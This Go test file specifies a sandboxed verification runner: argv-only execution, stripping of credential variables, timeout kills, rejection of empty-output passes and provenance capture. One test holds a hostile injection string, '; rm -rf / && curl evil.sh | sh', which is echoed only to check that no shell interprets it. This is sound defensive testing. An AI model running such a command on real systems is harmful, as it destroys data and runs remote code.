package core

import (
	"context"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// RED-phase behavior tests for the Sandboxed verification runner
// (internal/core/verification_runner.go, GREEN target).
//
// Contract pinned here (from the parent acceptance criteria):
//   1. Command runs via argv — an injection string (`; rm -rf /` class) must
//      never be interpreted by a shell metacharacter layer (no `sh -c`).
//   2. Credential environment variables must be absent from the child process.
//   3. Timeout kills the child process.
//   4. A vacuous zero-output pass (exit 0, no output) is rejected.
//   5. Provenance (argv, exit code, timing) is captured; events are emitted on
//      both pass and fail paths.

func newTestVerificationRunner(t *testing.T, credentialEnvVars []string) *VerificationRunner {
	t.Helper()
	return NewVerificationRunner(VerificationRunnerConfig{
		CredentialEnvVars: credentialEnvVars,
	})
}

// AC 1: injection string never reaches a shell metacharacter layer — the
// runner executes argv directly, so metacharacters arrive at the child intact
// as a single argument and are never interpreted by a shell.
func TestVerificationRunner_InjectiveArgNotShell(t *testing.T) {
	r := newTestVerificationRunner(t, nil)

	injection := `; rm -rf / && curl evil.sh | sh`
	spec := VerificationSpec{
		Command: []string{"/bin/echo", injection},
		Timeout: 10 * time.Second,
	}

	res := r.Run(context.Background(), spec)

	if !res.Passed {
		t.Fatalf("expected pass for argv-delivered injection string, got fail: exit=%d stderr=%q", res.ExitCode, res.Stderr)
	}
	got := strings.TrimRight(res.Stdout, "\n")
	if got != injection {
		t.Fatalf("shell metacharacter layer interpreted the argument: want verbatim %q, got %q", injection, got)
	}
}

// AC 1 (companion): the runner must not route the command through `sh -c`.
// If it did, a second argument containing shell metacharacters would change
// the child's parsed command. Pin by passing a metacharacter-bearing second
// argv element to a program that echoes argv verbatim.
func TestVerificationRunner_SecondArgvElementUntouchedByShell(t *testing.T) {
	r := newTestVerificationRunner(t, nil)

	spec := VerificationSpec{
		Command: []string{"/bin/echo", "a;b", "c&d|e"},
		Timeout: 10 * time.Second,
	}
	res := r.Run(context.Background(), spec)

	if !res.Passed {
		t.Fatalf("expected pass: exit=%d stderr=%q", res.ExitCode, res.Stderr)
	}
	got := strings.TrimRight(res.Stdout, "\n")
	if got != "a;b c&d|e" {
		t.Fatalf("argv was reparsed by a shell: want %q, got %q", "a;b c&d|e", got)
	}
}

// AC 2: credential env vars must be absent in the child process environment.
func TestVerificationRunner_CredentialEnvNotInChild(t *testing.T) {
	secret := "super-secret-token-value-1"
	awsSecret := "aws-secret-value-2"
	r := newTestVerificationRunner(t, []string{"GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY"})

	// Child prints whether the credentials leaked, without a shell on the
	// runner's side. printenv prints the value if present, exits nonzero
	// silently if absent.
	spec := VerificationSpec{
		Command: []string{"/usr/bin/printenv", "GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY", "PATH"},
		ExtraEnv: []string{
			"GITHUB_TOKEN=" + secret,
			"AWS_SECRET_ACCESS_KEY=" + awsSecret,
		},
		Timeout: 10 * time.Second,
	}
	res := r.Run(context.Background(), spec)

	if !res.Passed {
		t.Fatalf("expected pass (PATH should resolve, credentials stripped): exit=%d stdout=%q stderr=%q", res.ExitCode, res.Stdout, res.Stderr)
	}
	if strings.Contains(res.Stdout, secret) || strings.Contains(res.Stdout, awsSecret) {
		t.Fatalf("credential env vars leaked into child process: stdout=%q", res.Stdout)
	}
	if !strings.Contains(res.Stdout, "/") {
		t.Fatalf("non-credential env (PATH) should still be inherited: stdout=%q", res.Stdout)
	}
}

// AC 3: timeout kills the child. The child carries a unique marker so the test
// can prove the process is really gone after Run returns.
func TestVerificationRunner_TimeoutKillsProcess(t *testing.T) {
	r := newTestVerificationRunner(t, nil)

	marker := "verification-runner-timeout-test-marker"
	spec := VerificationSpec{
		// sh -c is the CHILD's own invocation (the sandbox contract governs
		// how the RUNNER execs, not what a test's child may run); the marker
		// lets the test find the sleeper process afterwards.
		Command: []string{"/bin/sh", "-c", "sleep 30 # " + marker},
		Timeout: 700 * time.Millisecond,
	}

	start := time.Now()
	res := r.Run(context.Background(), spec)
	elapsed := time.Since(start)

	if res.Passed {
		t.Fatalf("expected failure on timeout")
	}
	if !res.TimedOut {
		t.Fatalf("expected TimedOut=true on timeout kill")
	}
	if !res.Provenance.TimedOut {
		t.Fatalf("provenance must record the timeout")
	}
	if elapsed > 5*time.Second {
		t.Fatalf("timeout did not kill promptly: elapsed=%v", elapsed)
	}

	// Give the killer a moment, then prove the sleeper is dead.
	time.Sleep(300 * time.Millisecond)
	out, pgErr := exec.Command("pgrep", "-f", marker).Output()
	if pgErr != nil && !isNoMatchExit(pgErr) {
		t.Fatalf("pgrep probe failed: %v", pgErr)
	}
	if strings.TrimSpace(string(out)) != "" {
		t.Fatalf("timeout did not kill the child: still running: %s", strings.TrimSpace(string(out)))
	}
}

// AC 4: vacuous zero-output pass is rejected — exit 0 with no output must not
// count as a passing verification.
func TestVerificationRunner_RejectsVacuousZeroOutput(t *testing.T) {
	r := newTestVerificationRunner(t, nil)

	spec := VerificationSpec{
		Command: []string{"/bin/true"},
		Timeout: 10 * time.Second,
	}
	res := r.Run(context.Background(), spec)

	if res.Passed {
		t.Fatalf("vacuous zero-output pass must be rejected")
	}
	if !res.Vacuous {
		t.Fatalf("result must flag Vacuous=true for zero-output pass")
	}
	if res.ExitCode != 0 {
		t.Fatalf("vacuous detection applies to exit 0; got exit=%d", res.ExitCode)
	}
}

// Non-vacuous positive control: real output + exit 0 passes.
func TestVerificationRunner_RealOutputPasses(t *testing.T) {
	r := newTestVerificationRunner(t, nil)

	spec := VerificationSpec{
		Command: []string{"/bin/echo", "all checks green"},
		Timeout: 10 * time.Second,
	}
	res := r.Run(context.Background(), spec)

	if !res.Passed {
		t.Fatalf("expected pass with real output: exit=%d stdout=%q", res.ExitCode, res.Stdout)
	}
	if res.Vacuous {
		t.Fatalf("non-empty output must not be flagged vacuous")
	}
}

// AC 5: provenance captured — argv, exit code, timing, all populated.
func TestVerificationRunner_ProvenanceCaptured(t *testing.T) {
	r := newTestVerificationRunner(t, nil)

	spec := VerificationSpec{
		Command: []string{"/bin/echo", "prov"},
		Timeout: 10 * time.Second,
	}
	res := r.Run(context.Background(), spec)

	p := res.Provenance
	if len(p.Argv) != 2 || p.Argv[0] != "/bin/echo" || p.Argv[1] != "prov" {
		t.Fatalf("provenance argv must record the exact argv: %v", p.Argv)
	}
	if p.ExitCode != 0 {
		t.Fatalf("provenance exit code: want 0, got %d", p.ExitCode)
	}
	if p.StartedAt.IsZero() || p.FinishedAt.IsZero() {
		t.Fatalf("provenance must record start/finish times: %+v", p)
	}
	if p.FinishedAt.Before(p.StartedAt) {
		t.Fatalf("provenance times out of order: %+v", p)
	}
}

// AC 5: events emitted on both pass and fail paths.
func TestVerificationRunner_EventsOnPassAndFail(t *testing.T) {
	dir := t.TempDir()
	sink := NewEventSink(dir)
	r := newTestVerificationRunner(t, nil)

	passSpec := VerificationSpec{Command: []string{"/bin/echo", "ok"}, Timeout: 10 * time.Second}
	r.RunWithEvents(context.Background(), passSpec, sink)

	failSpec := VerificationSpec{Command: []string{"/bin/false"}, Timeout: 10 * time.Second}
	r.RunWithEvents(context.Background(), failSpec, sink)

	entries := readAllJSONLEvents(t, dir)
	var sawPass, sawFail bool
	for _, ev := range entries {
		switch ev.Type {
		case "verification_passed":
			sawPass = true
		case "verification_failed":
			sawFail = true
		}
	}
	if !sawPass {
		t.Fatalf("no verification_passed event emitted; got %d events", len(entries))
	}
	if !sawFail {
		t.Fatalf("no verification_failed event emitted; got %d events", len(entries))
	}
}

// --- small helpers local to this test file ---

func isNoMatchExit(err error) bool {
	// pgrep exits 1 when no process matches.
	if err == nil {
		return false
	}
	return strings.Contains(err.Error(), "exit status 1")
}

func readAllJSONLEvents(t *testing.T, dir string) []Event {
	t.Helper()
	fis, err := os.ReadDir(dir)
	if err != nil {
		t.Fatalf("read event dir: %v", err)
	}
	var evs []Event
	for _, fi := range fis {
		if fi.IsDir() || filepath.Ext(fi.Name()) != ".jsonl" {
			continue
		}
		b, err := os.ReadFile(filepath.Join(dir, fi.Name()))
		if err != nil {
			t.Fatalf("read event file: %v", err)
		}
		for _, line := range strings.Split(strings.TrimSpace(string(b)), "\n") {
			if line == "" {
				continue
			}
			var ev Event
			if err := json.Unmarshal([]byte(line), &ev); err != nil {
				t.Fatalf("parse event line: %v", err)
			}
			evs = append(evs, ev)
		}
	}
	return evs
}
